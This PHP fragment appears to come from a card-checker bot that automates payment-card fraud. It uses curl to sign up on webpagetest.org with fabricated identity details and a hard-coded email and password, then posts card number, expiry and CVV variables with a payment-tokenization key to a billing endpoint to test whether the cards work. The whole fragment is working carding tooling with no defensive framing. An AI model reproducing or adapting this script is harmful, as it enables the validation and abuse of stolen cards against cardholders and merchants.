...
|×| 𝙍𝙀𝙌 𝘽𝙔 ↯ @$username</b>",
    ...
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'first-name=jasser&last-name=abbassi&company-name=joe+catain&email=shmoxd%40gmail.com&password=shmoxd.YFZ.123&confirm-password=shmoxd.YFZ.123&street-address=hay+jadid+0000&city=majel&state=11&country=TN&zipcode=1214&terms-service=on&csrf_token=' . $at . '&plan=MP5&step=2');
    ...
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"key":"chjs_6nx8y5rbw875f78dn5yx7n9g","revision":"2024-08-12","credit_card":{"first_name":"shmoxd","last_name":"shmoxd","full_number":"' . $cc . '","expiration_month":"' . $mes . '","expiration_year":"' . $ano . '","cvv":"' . $cvv . '","billing_address":"hay jadid 0000","billing_city":"majel","billing_state":"11","billing_country":"TN","billing_zip":"1214"},"origin":"https://www.webpagetest.org"}');
